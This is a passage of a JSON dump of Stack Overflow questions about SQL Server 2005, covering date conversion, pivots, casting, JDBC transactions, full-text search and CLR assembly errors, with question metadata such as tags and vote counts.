maybe the last statement should not have a <code>GO</code> ?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":3851,"score":1,"question_id":2569998,"title":"to_date in SQL Server 2005","body":"<p>Does any one know how I would have to change the following to work with ms sql?</p>\n\n<pre><code>WHERE registrationDate between to_date ('2003/01/01', 'yyyy/mm/dd')\nAND to_date ('2003/12/31', 'yyyy/mm/dd');\n</code></pre>\n\n<p>What I have read implies I would have to construct it using DATEPART() which could become very long winded. Especially when the goal would be to compare on dates which I receive in the following format \"2003-12-30 10:07:42\". It would be nice to pass them off to the database as is.</p>\n\n<p>Any pointers appreciated.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":2120,"score":4,"question_id":2009976,"title":"Differance Between Persist Security Info And Integrated Security","body":"<p>Hi \n I know about Integrated Security =True/SSPI is same, but do not know about Persist Security=True\nCould you please explain\nThanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql","casting"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":4670,"score":4,"question_id":4936180,"title":"Cast integer and concatenate to varchar in TSQL","body":"<p>I'm trying to write a stored procedure to assist with development of our database, but I'm having some trouble using it. For example:</p>\n\n<pre><code>DECLARE @pID int;\nSET @pID = 1;\nEXEC WriteLog 'Component', 'Source', 'Could not find given id: ' + CAST(@pID AS varchar);\n</code></pre>\n\n<p>This yields the error (on SQL Server 2005)</p>\n\n<blockquote>\n  <p>Msg 102, Level 15, State 1, Line 4\n  Incorrect syntax near '+'.</p>\n</blockquote>\n\n<p>Can someone explain to me why my syntax is incorrect, and the right way to solve this problem?</p>\n"},{"tags":["jquery","asp.net-mvc","mvc","sql-server-2005","table"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":217,"score":-1,"question_id":10053693,"title":"How can I add an HTML jQuery table to display a database?","body":"<p>I need to show a database in a table present in the ASP.NET. I got some suggestions, such as DataGridView slowing down our process. So I use jQuery table. But how do I display the data in jQuery table in an ASP.NET MVC webpage from an SQL&nbsp;Server database.</p>\n"},{"tags":["html","sql-server-2005","jsp","csv"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12017864,"title":"How to save .csv on client computer in jsp?","body":"<p>I am exporting data from jsp to excel as .csv. But I want it to save that .csv file on client, if it request to. Do I need to download code for save file dialog in HTML. I am using JSP and mssql server 2005. Here is my code:</p>\n\n<pre><code>FileWriter fw = new FileWriter(\"C:\\\\PHPLExcel.csv\");\nfw.append(\"Sr.No.\");\nfw.append(',');\nfw.append(\"Name\");\nfw.append(',');\nfw.append(\"Address\");\nfw.append(',');\nfw.append(',');\nfw.append('\\n');\nfw.flush();\nfw.close();\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","json","sql-server-2008","sql-server-2005","json.net"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":131,"score":2,"question_id":12012810,"title":"What data type should be correct to store JSON content as string?","body":"<p>I plan to use JSON.NET to serialize and deserialize objects to and with the json string store it in the database.</p>\n\n<p>What datatype of the SQL Server 2008 should be the best to store it?</p>\n\n<ul>\n<li>nvarchar(max)?</li>\n<li>varchar(max)?</li>\n</ul>\n"},{"tags":["c#","visual-studio","sql-server-2005","visual-studio-2008","licenses.licx"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12014075,"title":"Build Runtime Licenses not showing as an option","body":"<p>I have a VS 2008 project. I added the licenses.licx project to the root, but when I right click on it, I see no, \"Build Runtime Licenses\". What am I missing?</p>\n"},{"tags":["sql-server-2005","pattern-matching"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":50,"score":1,"question_id":12012503,"title":"SQL Server pattern match without RegEx","body":"<p>I am trying to search all instances of an expression used in stored procedures and have this:</p>\n\n<pre><code>SELECT name, type_desc, create_date, modify_date\n    FROM sys.procedures \n    WHERE OBJECT_DEFINITION(object_id) LIKE '%ufn_TurnFlagOn(5,ColumnA)%'\nORDER BY name\n</code></pre>\n\n<p>But this will not return the sps that may have a space between the function parameters like: </p>\n\n<pre><code>ufn_TurnFlagOn( 5,ColumnA )\nufn_TurnFlagOn(5, ColumnA)\nufn_TurnFlagOn( 5,ColumnA)\n</code></pre>\n\n<p>Please note:</p>\n\n<ul>\n<li>I cannot use the \"_\" wildcard like this <code>LIKE\n'%ufn_TurnFlagOn(_5_,_ColumnA_)%'</code> because it matches exactly a\nsingle character, hence it will not match\n<code>ufn_TurnFlagOn(5,ColumnA)</code> and some more.</li>\n<li>I do not have CLR Integration (nor can I register it now) hence I\ncannot use regexes.</li>\n</ul>\n\n<p>Alternative is to run the query multiple times with all possibilities, but is there a better way to accomplish this in 1 query?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","visual-studio-2008"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":77,"score":0,"question_id":12012186,"title":"Assembly in host store has a different signature than assembly in GAC","body":"<p>I have added a third party dll (Extreme.Numerics.Net20.dll to my sql server assemblies). I then opened by VS 2008 project and added that assembly as a reference. Then I built and released my project and it created a PowerstatRegression.dll. Then I add that assembly to SQL Server as well. But when I run my code, I still get this:</p>\n\n<pre><code>Error message: System.IO.FileLoadException: Could not load file or assembly \n'Extreme.Numerics.Net20, Version=3.6.10055.0, Culture=neutral, \nPublicKeyToken=9e513770f58567b2' or one of its dependencies. Assembly in host store has a \ndifferent signature than assembly in GAC. (Exception from HRESULT: 0x80131050) File name: \n'Extreme.Numerics.Net20, Version=3.6.10055.0, Culture=neutral, \nPublicKeyToken=9e513770f58567b2' at \nPowerStatRegression.matrix.MatrixHandler.MultiplyMatrixByArray(Double[][] a, Double[] b) at \n</code></pre>\n\n<p>Why is this happening? Everything builds correctly with no errors.</p>\n"}]}
{"total":14387,"page":11,"pagesize":100,"questions":[{"tags":["asp.net","sql-server-2005","binary"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":970,"score":0,"question_id":4449544,"title":"how to save a docx file in sql server 2005 and display it in aspx pages as docx document","body":"<p>I am using visual studio 2005 and sql server 2005 to make an application.</p>\n\n<p>I want to save user's doc,docx file in a database and show the uploaded user doc ,docx file in an asp page.</p>\n\n<p>How to achieve this ?</p>\n"},{"tags":["sql-server-2005","query","table","pivot"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":407,"score":1,"question_id":842926,"title":"How to Pivot data from one table with SQL server 2005","body":"<p>I would like to create a query from a single table with the following columns.</p>\n\n<p>SEQNO is a unique key</p>\n\n<pre><code>Name   ID   Amount   Date          JOBID       SEQNO\nMark    9    200     1/2/09         1001         1\nPeter   3    300     1/2/09         1001         2\nSteve   1    200     2/2/09         1001         3\nMark    9    200     3/2/09         1001         4\nPeter   3    300     4/2/09         1001         5\nSteve   1    200     5/2/09         1001         6\nHally   1    200     5/2/09         1002         7\n</code></pre>\n\n<p>The query should output in this format by SUBJOBID and a date range:-</p>\n\n<pre><code>**NAME      ID      1/2       2/2     3/2     4/2     5/2      JOBID**&lt;br&gt;\nMark        9       200       NULL    200     NULL    NULL     1001   \nPeter       3       300       NULL    NULL    300     NULL     1001   \nSteve       1       NULL      200     NULL    NULL    200      1001\n</code></pre>\n\n<p>I have been going over pivot queries for this. But I don't seem to get anywhere. Could some one help ?</p>\n"},{"tags":["php","sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12011458,"title":"(?) marks in HTML. Encoding issue from content from the database?","body":"<p>Any idea why this is happening?</p>\n\n<p><img src=\"http://i.stack.imgur.com/f8qA6.png\" alt=\"enter image description here\"></p>\n\n<p>It looks to be happening mainly with apostrophes and hyphens. Any ideas if I can fix this? I pull the data from my database and print it to the page like:</p>\n\n<pre><code>&lt;div class=\"block\"&gt;\n              &lt;?=$details['agenda'] ?&gt;\n&lt;/div&gt;\n</code></pre>\n"},{"tags":["sql","sql-server-2005","pivot"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":8882921,"title":"SQL Query pivot approach assistance","body":"<p>i am really struggling with this pivot and hoped reaching out for help and enlightenment might help. </p>\n\n<p>Say i have the following table....\nTable A</p>\n\n<pre><code>type      actId date        rowSort   order value   value_char  colName\n------------------------------------------------------------------------------------\nchecking  1003   2011-12-31  2          1   44      44          Amount\nchecking  1003   2011-12-31  2          2   55      55          Interest\nchecking  1003   2011-12-31  2          3   66      66          Change\nchecking  1003   2011-12-31  2          4   77      77          Target\nchecking  1003   2011-12-31  2          5   88      88          Spread\nsavings   23456  2011-12-31  1          1   999     999         Amount\nsavings   23456  2011-12-31  1          2   888     888         Interest\nsavings   23456  2011-12-31  1          3   777     777         Change\nsavings   23456  2011-12-31  1          4   666     666         Target\nsavings   23456  2011-12-31  1          5   555     555         Spread\n</code></pre>\n\n<p>And i want to transpose to table b </p>\n\n<pre><code>checking  chkId date        rowSort   order chkvalue  chkValchar  colName  savings   savId  savVal  savValChar\n-------------------------------------------------------------------------------------------------------------------\nchecking  1003   2011-12-31  2          1   44        44          Amount    savings   23456  999          999           \nchecking  1003   2011-12-31  2          2   55        55          Interest  savings   23456  888          888           \nchecking  1003   2011-12-31  2          3   66        66          Change    savings   23456  777          777\nchecking  1003   2011-12-31  2          4   77        77          Target    savings   23456  666          666\nchecking  1003   2011-12-31  2          5   88        88          Spread    savings   23456  555          555\n</code></pre>\n\n<p>I can admit this is beyond my skills at the moment.<br>\nI believe i need to do a pivot on this table, using the rowSort (identify savings vs checking) along with ordering using the order column.  This maybe wrong and that is why i am here.  </p>\n\n<p>Is a pivot the right way to go?  Am i right to assume my pivot is to use the aggregate max(rowSort)?</p>\n"},{"tags":["sql-server-2005","join","uniqueidentifier","unique-constraint"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":12007867,"title":"Join Talbe to itself having count > 1","body":"<p>I have a <code>Personal</code> table with a <code>LastName</code> column and a <code>MaybeUniqueID</code>.\nI want to put in output a table with a <code>LastName</code> column where the counter set on to the column <code>MaybeUniqueID</code> gives more than 1 row.</p>\n\n<ul>\n<li>I would like to do everything in one unique run, avoiding mid-step outputs.</li>\n<li>I prefere not using temporary table or table variables, otherwise I would like to use at most one table variable (not temporary tables), but I think this should not be necessary.</li>\n<li>I am using Microsoft SQL Server 2005.</li>\n</ul>\n\n<p>I tried different scenarios with different SQL statements like <code>HAVING</code> or <code>GROUP BY</code>, but I failed to get the outcome I am looking for.\nPlease have a look at the following not-working summary test: </p>\n\n<pre><code>SELECT LastName\nFROM   Personal\n       JOIN\n              (SELECT  MaybeUniqueID AS ID2,\n                       COUNT(*)      AS CNT\n              FROM     Personal\n                       --WHERE CNT &gt; 1\n              GROUP BY MaybeUniqueID\n              HAVING   cnt &gt; 1\n              ) AS MultiMaybeUniqueID\n       ON     Personal.MaybeUniqueID = MultiMaybeUniqueID.ID2\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures","csv"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":141,"score":0,"question_id":12005078,"title":"Get all values from one column of a CSV string using Stored Procedure","body":"<p>Within a stored procedure, I need to take a whole CSV file as a string, then pick out all the values in one \"column\" to do a further query on the database.</p>\n\n<p>I cannot use a saved doc - so i think that rules out openrowset, and the whole thing has to be done within a stored procedure.</p>\n\n<p>Have spent hours googling and trying, but can find a good answer. One possible was <a href=\"http://www.tainyan.com/articles/entry-32/converting-csv-to-sql-data-table-with-stored-procedure.html\" rel=\"nofollow\">http://www.tainyan.com/articles/entry-32/converting-csv-to-sql-data-table-with-stored-procedure.html</a> but it doesnt work and i can find the error.</p>\n\n<p>How should this be done please?</p>\n"},{"tags":["sql-server","sql-server-2005","query-execution-plans","ssms2008"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":11213516,"title":"Execution Plan for a long stored proc cuts off. How to view it in SSMS?","body":"<p>I am trying to look at an execution plan for a sproc that has a massive amount of statements, looping, etc...  As you can imagine, the execution plan is really long.  In fact, SSMS gets confused before the interesting part that I am trying to look at.</p>\n\n<p><img src=\"http://i.stack.imgur.com/ie9lX.jpg\" alt=\"enter image description here\"></p>\n\n<p>Is there anyway to see the entire execution plan?</p>\n\n<p>Btw, using SSMS 2008 to hit SQL Server 2005.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12006713,"title":"Find where a row of data in one column doesn't exist in another column","body":"<p>so I'm trying to figure out a way to compare each and every row of a column against all the rows in another column and filter out those that doesn't exist in the column that it is comparing to. I understand how to compare the two columns on a row-by-row basic like this:</p>\n\n<pre><code>select table1.column1\nfrom table1 inner join\n     table2 on table1.id = table2.id\nwhere column1 &lt;&gt; column2\n</code></pre>\n\n<p>But I want to compare the rows from table1 in column1 against ALL the rows of column2 in table2 and find rows in column1 that doesn't exist in column2 at all. So it would be something like columns with these values:</p>\n\n<pre><code>Column1        Column2\n1              2\n2              1\n4              3\n5              5\n7              6\n</code></pre>\n\n<p>And after the SQL it would become something like this:</p>\n\n<pre><code>Column1\n4\n7 \n</code></pre>\n"},{"tags":["sql-server-2005","reporting-services","asp.net-2.0"],"answer_count":11,"favorite_count":4,"up_vote_count":9,"down_vote_count":0,"view_count":3457,"score":9,"question_id":507470,"title":"SQL Server 2005 Reporting Services - Pros and Cons","body":"<p>I am developing a web application using ASP .NET 2.0, VS 2008 and SQL Server 2005. I would like to Use SSRS 2005 for the various reports I need to build for this web application. I would like to convince the team that we should adopt SSRS as the main reporting platform for most internal and external web applications we have. </p>\n\n<p>What are the pros and cons of Reporting Services? I can see many pros like tight integration with IIS, SQL Server and Visual Studio, rich presentation features and export functionality, subscription etc so I am mainly interested in negatives of SSRS.</p>\n\n<p>EDIT: I understand that if I am not using VS 2005 for my application development, I will be using different Visual Studio versions for application and report development. However, I am more interested in negatives (or not so good aspects) of SSRS itself.</p>\n"},{"tags":["asp.net","sql","sql-server","database","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":46,"score":1,"question_id":12005335,"title":"asp.net dynamically loaded","body":"<p>I am having some problem in my data base connection when I am trying to dynamically load my page using data grid view in asp.net i am getting some error like:-</p>\n\n<blockquote>\n  <p>An error has occurred while establishing a connection to the server.\n  When connecting to SQL Server 2005, this failure may be caused by the\n  fact that under the default settings SQL Server does not allow remote\n  connections.  provider: Named Pipes Provider, error: 40 - Could not\n  open a connection to SQL Server</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005","delete"],"answer_count":4,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":6339,"score":0,"question_id":1665868,"title":"How to detect and remove a column that contains only null values?","body":"<p>In my table <strong>table1</strong> there are 6 columns Locations,a,b,c,d,e.</p>\n\n<p>Locations [a]   [b]   [c]  [d]   [e]</p>\n\n<p>[1]       10.00 Null  Null 20.00 Null</p>\n\n<p>[2]       Null  30.00 Null Null  Null</p>\n\n<p>i need the result like</p>\n\n<p>Locations [a]   [b]   [d]</p>\n\n<p>[1]       10.00 Null  20.00</p>\n\n<p>[2]       Null  30.00 Null</p>\n\n<p>My question is how to detect and delete column that contains all null values using sql query.\nIs it possible?</p>\n\n<p>If yes then please help and give sample.</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql-server","sql-server-2005","last-modified"],"answer_count":4,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1652,"score":2,"question_id":3969748,"title":"Last modification date for a live SQL Server 2005 database","body":"<p>Is there a way to know when the last write operation has occurred in a live SQL Server 2005 database?</p>\n\n<p>I currently have 30 (and growing) databases on my server. Only some of these see daily activity (but which ones get daily activity varies over time.) My backup space is limited and I'd like to do a daily backup of all \"modified since last backup\" databases.</p>\n\n<p>In fact, I'm asking the reverse of <a href=\"http://stackoverflow.com/questions/486685/find-out-the-last-write-date-in-a-sql-server-database\">this</a> question. Instead of asking last write date from a backup to see if I should restore it, I want to tell last write date of a live database to see if I should back it up.</p>\n\n<p>Since the backups run on the server itself, I could check the last modification time of the log, but that isn't very clean, nor I'm sure is totally reliable.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","null"],"answer_count":7,"favorite_count":2,"up_vote_count":7,"down_vote_count":0,"view_count":2467,"score":7,"question_id":377798,"title":"Field value must be unique unless it is NULL","body":"<p>I'm using SQL Server 2005.</p>\n\n<p>I have a field that must either contain a unique value or a NULL value. I think I should be enforcing this with either a <code>CHECK CONSTRAINT</code> or a <code>TRIGGER for INSERT, UPDATE</code>.</p>\n\n<p>Is there an advantage to using a constraint here over a trigger (or vice-versa)? What might such a constraint/trigger look like?</p>\n\n<p>Or is there another, more appropriate option that I haven't considered? </p>\n"},{"tags":["java","sql-server-2005","jdbc","transactions","commit"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":79,"score":0,"question_id":11987378,"title":"Java transaction - commit on conn doesn't","body":"<p>Suppose I have the following Java code fragment (where something like it is embedded in a legacy app)</p>\n\n<pre><code>...\ntry {\n    con.setAutoCommit(false);\n    updateSales = con.prepareStatement(updateString);\n    updateTotal = con.prepareStatement(updateStatement);\n\n    updateSales.setInt(1, e.getValue().intValue());\n    updateSales.setString(2, e.getKey());\n    updateSales.executeUpdate();\n    updateTotal.setInt(1, e.getValue().intValue());\n    updateTotal.setString(2, e.getKey());\n    updateTotal.executeUpdate();\n    con.commit();\n} catch (SQLException e ) {\n...\n</code></pre>\n\n<p>Assuming this is connecting to an SQL Server 2005 database (with the ms 2005 driver) - is there any reason that the con.commit would NOT commit the transaction?</p>\n"},{"tags":["java","sql-server-2005","jdbc"],"answer_count":0,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":198,"score":2,"question_id":7839233,"title":"Jdbc Ms SQL Driver 3.0 callable statement using default parameters","body":"<p>What is the best way to reuse a <code>CallableStatement</code>\nI want to use the same <code>msp_updateOption</code> in different ways and make it reusable code.\nAlso the <code>CallableStatement</code> should take input as parameter type and not indexes.</p>\n\n<pre><code>private static final String UPDATE_INFO = \"{call msp_updateOption (?,?,?,?,?,?,?,?,?,?)}\";\nprivate static final String UPDATE__INFO_NO_COMMENT = \"{call msp_updaterOption (?,?,?,?,?,?,?,?,?)}\";\nprivate static final String UPDATE_INFO_NO_COMMENT_NO_G = \"{call msp_updateOption (?,?,?,?,?,?,?,?)}\";\n\nALTER procedure [dbo].[msp_UpdateOption]\n@pnbr int,\n@pB datetime=null,\n@stopFlag int,\n@emailFlag int,\n@name varchar(100),\n@pName varchar(100),\n@pID varchar(100),\n@gNbr int=null,\n@commentTypeID int=null,\n@updateTypeID int\n</code></pre>\n\n<p>I tried implementing something like this: where map = <code>HashMap</code> having <code>name-value</code> pairs. <code>name</code> is <code>param name</code>.</p>\n\n<pre><code>Set set = map.keySet();\nIterator itr = set.iterator(); // iterate through HashMap values\n// iterator\ntry {\n    while (itr.hasNext()) {\n        String paramType = (String) (itr.next());\n        cstmt.setObject(paramType,map.get(paramType));\n        cstmt.execute();\n    } \n</code></pre>\n\n<p>while executing this , it always goees beyond the index defined for the sp and errors out.\nWill this implementation work. It worked with the older version JDBC driver of MS SQL \nThis is the error I get. </p>\n\n<pre><code> com.microsoft.sqlserver.jdbc.SQLServerException: The index 10 is out of range.\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:171)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.setterGetParam(SQLServerPreparedStatement.java:700)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.setObjectNoType(SQLServerPreparedStatement.java:896)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.microsoft.sqlserver.jdbc.SQLServerCallableStatement.setObject(SQLServerCallableStatement.java:1379)\n[10/20/11 18:56:25:082 CDT] 0000002d SystemOut     O    at com.ibm.ws.rsadapter.jdbc.WSJdbcCallableStatement.setObject(WSJdbcCallableStatem\n</code></pre>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":203,"score":2,"question_id":12001783,"title":"TSQL Select Min & Max row when grouping","body":"<p>Lets say I have a table containing many many rows like this:</p>\n\n<pre><code>ID        Range         Range_begining        Profit\n----------------------------------------------------\n 1    (100-150)                    100           -20\n 2    (200-250)                    200          40.2\n 3    (100-150)                    100           100\n 4    (450-500)                    450           -90\n ...\n</code></pre>\n\n<p>I'm doing a simple query like this:</p>\n\n<pre><code>SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n    FROM\n        Orders\n    GROUP BY\n        Range_begining\n</code></pre>\n\n<p>After this query is run I get results like this:</p>\n\n<pre><code>Range        Count        AVG Profit\n------------------------------------\n(100-150)        2                40\n(200-250)        1              40.2\n(450-500)        1               -90\n ...\n</code></pre>\n\n<p>Quite simple :)</p>\n\n<p>What I need to do now is to select row with minimum and maximum profit where count is bigger than 10 (this is a parameter)</p>\n\n<p>I was able to get minimum value with this:</p>\n\n<pre><code>SELECT TOP 1 [Range], [AVG Profit] FROM (\n     SELECT max([Range]) AS 'Range'\n         , count(ID) AS 'Count'\n         , round(avg([Profit]), 2) AS 'AVG Profit'\n        FROM\n            Orders\n        GROUP BY\n            Range_begining) X\nWHERE\n    [Count]&gt;10\nORDER BY \n    [AVG Profit] ASC --or DESC if I want max profit\n</code></pre>\n\n<p>I was thinking of doing an <code>UNION</code> for above query with ORDER BY DESC, but it isn't the best solution.</p>\n\n<p>What I need to do:<br />\n<strong>Select 2 rows: one with minimum, second with maximum AVG Profit when grouping by Range.</strong></p>\n\n<p><strong>EDIT:</strong>\nIf I add 2 move columns to my main data table like this:</p>\n\n<pre><code>ID        Range         Range_begining        Profit        OrderDate     Company\n---------------------------------------------------------------------------------\n 1    (100-150)                    100           -20        2012-01-02          1\n 2    (200-250)                    200          40.2        2012-03-22          0\n 3    (100-150)                    100           100        2012-02-05          0\n 4    (450-500)                    450           -90        2012-05-12          1\n ...\n</code></pre>\n\n<p>And then try to add 2 more conditions like this:</p>\n\n<pre><code>; with ordering as (\n  SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n     , row_number() over (order by avg([Profit])) rn_min\n     , row_number() over (order by avg([Profit]) desc) rn_max\n    FROM\n        Orders\n    GROUP BY\n        Range_begining\n    HAVING COUNT(ID) &gt; 10\n    AND [Company]=@company\n    AND (@from= '' OR [OrderDate]&gt;=@from)\n    AND (@to= '' OR [OrderDate]&lt;=@to)\n)\nselect [range], [count], [avg profit]\n  from ordering\n where (rn_max = 1 or rn_min = 1)\n</code></pre>\n\n<p>I get an error because [Company] and [OrderDate] </p>\n\n<blockquote>\n  <p>is invalid in the HAVING clause because it is not contained in either\n  an aggregate function or the GROUP BY clause.</p>\n</blockquote>\n\n<p>How can I fix this?</p>\n\n<p><strong>EDIT2</strong>\nGot it working!</p>\n\n<pre><code>; with ordering as (\n  SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n     , row_number() over (order by avg([Profit])) rn_min\n     , row_number() over (order by avg([Profit]) desc) rn_max\n    FROM\n        Orders\n    WHERE\n    [Company]=@company\n    AND (@from= '' OR [OrderDate]&gt;=@from)\n    AND (@to= '' OR [OrderDate]&lt;=@to)\n    GROUP BY\n        Range_begining\n    HAVING COUNT(ID) &gt; 10\n)\nselect [range], [count], [avg profit]\n  from ordering\n where (rn_max = 1 or rn_min = 1)\n</code></pre>\n\n<p><strong>EDIT 3</strong>\nCan I return another column with description like this:</p>\n\n<pre><code>Range        AVG Profit               Description\n-------------------------------------------------\n(200-250)          40.2           Max profit here\n(450-500)           -90     Min profit, well done\n</code></pre>\n\n<p><strong>EDIT 4</strong>\nFast answer (based on @Nikola Markovinovi answer):</p>\n\n<pre><code>; with ordering as (\n  SELECT max([Range]) AS 'Range'\n     , count(ID) AS 'Count'\n     , round(avg([Profit]), 2) AS 'AVG Profit'\n     , row_number() over (order by avg([Profit])) rn_min\n     , row_number() over (order by avg([Profit]) desc) rn_max\n    FROM\n        Orders\n    WHERE\n    [Company]=@company\n    AND (@from= '' OR [OrderDate]&gt;=@from)\n    AND (@to= '' OR [OrderDate]&lt;=@to)\n    GROUP BY\n        Range_begining\n    HAVING COUNT(ID) &gt; 10\n)\n    SELECT\n    CASE WHEN rn_max=1 THEN 'This is max' ELSE 'Min' END AS 'Description'\n    ,[range]\n    ,[count]\n    ,[avg profit]\n    FROM ordering\n    WHERE (rn_max = 1 or rn_min = 1)\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":12002376,"title":"Order by condition for two DATETIME columns ","body":"<p>I read <a href=\"http://stackoverflow.com/questions/2367457/order-by-condition\">ORDER BY condition</a> and <a href=\"http://stackoverflow.com/questions/4213270/how-to-add-condition-in-order-by\">How to add condition in &#39;order by&#39;?</a> but these don't answer to my issue.</p>\n\n<p>I have 2 datetime columns called <code>CREATION_DATE</code> and <code>UPDATE_DATE</code>.</p>\n\n<p>I want to sort (using <code>ORDER BY</code> clause) by :</p>\n\n<ul>\n<li><p><code>CREATION_DATE</code> if <code>CREATION_DATE = UPDATE_DATE</code></p>\n\n<p>or</p></li>\n<li><p><code>UPDATE_DATE</code> in other case.</p></li>\n</ul>\n\n<p>I wrote </p>\n\n<pre><code>SELECT * FROM Table1\nORDER BY\nCASE Table1.CREATION_DATE\n    WHEN Table1.CREATION_DATE = Table1.UPDATE_DATE THEN Table1.CREATION_DATE\n    ELSE Table1.UPDATE_DATE\nEND ASC\n</code></pre>\n\n<p>but it does not work, I get an error at the <code>=</code> symbol. </p>\n\n<p>I tried with other operators... Of course, I make mistake but I don't know if is correct to use operators in <code>WHEN</code> statement.</p>\n\n<p>Is not accepted operators in <code>WHEN</code> ?</p>\n\n<p>Thank you</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12000999,"title":"How to list the source table name of columns in a VIEW (SQL Server 2005)","body":"<p>Just wondering how to list column name and table name in one query for a view</p>\n\n<p>for example</p>\n\n<p>a view named as viewC, create by tbl1 inner join tbl2, contain a,b,c,d, 4columns.</p>\n\n<p>a,b from tbl1, c,d from tbl2</p>\n\n<p>How to Select COLUMN_NAME, DATA_TYPE, column_default, character_maximum_length, <strong>sourceTableNAME</strong> FROM information_schema.columns where table_name='viewC' together?</p>\n\n<p>Thanks </p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":93,"score":0,"question_id":12001006,"title":"What Is Difference Between {Server Name} localhost vs .\\SqlExpress","body":"<p>can you please tell me\nWhat Is Difference Between {Server Name} (local),localhost,(pc-name)\\SQLEXPRESS,.\\SqlExpress ...</p>\n"},{"tags":["sql-server","sql-server-2005","syntax-error"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":106,"score":-1,"question_id":12000646,"title":"SQL Server 2005 : Incorrect syntax near '='","body":"<p>Did any body face above error in SQL Server 2005 when using <code>+=</code> string concatenation operator. </p>\n\n<p>According to SQL Server 2005 books online, it should work, even the example shown in MSDN does not compile in SQL Server Management Studio 2005.</p>\n\n<p>In SQL server 2008 it works fine.  </p>\n\n<p>I think its bug in SQL Server 2005.</p>\n\n<p>The workaround is achieve the concatenation using <code>+</code> operator.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","full-text-search","containstable"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":90,"score":3,"question_id":11994281,"title":"Near matches not found in CONTAINSTABLE","body":"<p>I am using <strong><kbd>SQL Server 2008</kbd></strong></p>\n\n<h2>DDL</h2>\n\n<pre><code>CREATE TABLE [dbo].[t](\n    [words] [varchar](1000) NULL,\n    [id] [int] IDENTITY(1,1) NOT NULL\n) ON [PRIMARY]\n</code></pre>\n\n<h2>DML</h2>\n\n<pre><code>insert into t(words)values('this is my laptop')\ninsert into t(words)values('this does not contains headphone')\n</code></pre>\n\n<h2>SQL Query</h2>\n\n<pre><code>SELECT *\nFROM \nt as t\nJOIN CONTAINSTABLE(t, words,'\"headphone*\"', 10) fulltextSearch\nON\nt.Id = fulltextSearch.[KEY]\n</code></pre>\n\n<h2>Results</h2>\n\n<p>No record found</p>\n\n<p>I am expecting one records. Any Idea?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":11978193,"title":"Nested Select or Inner Join including rows from another table","body":"<p>I have a pretty complex select statement that returns counted statistics from tables (think of it as an answer bank -- the complex select statement below) using inner join. </p>\n\n<p>These answers are related to a table called Questions_Bank_AnswerChoices (which stores all the questions).  